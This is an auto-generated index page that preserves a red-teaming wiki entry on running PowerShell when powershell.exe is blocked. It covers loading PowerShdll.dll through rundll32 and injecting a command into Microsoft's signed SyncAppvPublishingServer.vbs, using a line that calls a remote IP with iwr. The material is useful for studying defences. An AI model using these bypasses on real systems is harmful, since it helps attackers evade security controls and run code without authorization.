---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Powershell Without Powershell.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-powershell-without-powershell` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/powershell-without-powershell.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Powershell Without Powershell.exe](../../topics/offensive-security/powershell-without-powershell.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-execution-powershell-without-powershell |
| name | Powershell Without Powershell.exe |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-execution/powershell-without-powershell.md |

## Preserved Source Material

````yaml
_asset_filenames:
- pwshll-SyncAppvPublishingServer.gif
- pwshll-SyncAppvPublishingServer.png
- pwshll-rundll32.gif
_body: '# Powershell Without Powershell.exe


  Powershell.exe is just a process hosting the System.Management.Automation.dll which essentially is the actual Powershell
  as we know it.


  If you run into a situation where powershell.exe is blocked and no strict application whitelisting is implemented, there
  are ways to execute powershell still.


  ## PowerShdll


  ```

  rundll32.exe PowerShdll.dll,main

  ```


  ![](../../.gitbook/assets/pwshll-rundll32.gif)


  Note that the same could be achieved with a compiled .exe binary from the same project, but keep in mind that .exe is more
  likely to run into whitelisting issues.


  ## SyncAppvPublishingServer


  Windows 10 comes with `SyncAppvPublishingServer.exe and` `SyncAppvPublishingServer.vbs` that can be abused with code injection
  to execute powershell commands from a Microsoft signed script:


  ```

  SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"

  ```


  ![](../../.gitbook/assets/pwshll-SyncAppvPublishingServer.png)


  ![](../../.gitbook/assets/pwshll-SyncAppvPublishingServer.gif)


  ## References


  {% embed url="https://github.com/p3nt4/PowerShdll" %}


  {% embed url="https://safe-cyberdefense.com/malware-can-use-powershell-without-powershell-exe/" %}


  {% embed url="https://www.youtube.com/watch?v=7tvfb9poTKg" %}'
_relative_path: offensive-security/code-execution/powershell-without-powershell.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/powershell-without-powershell.md
````
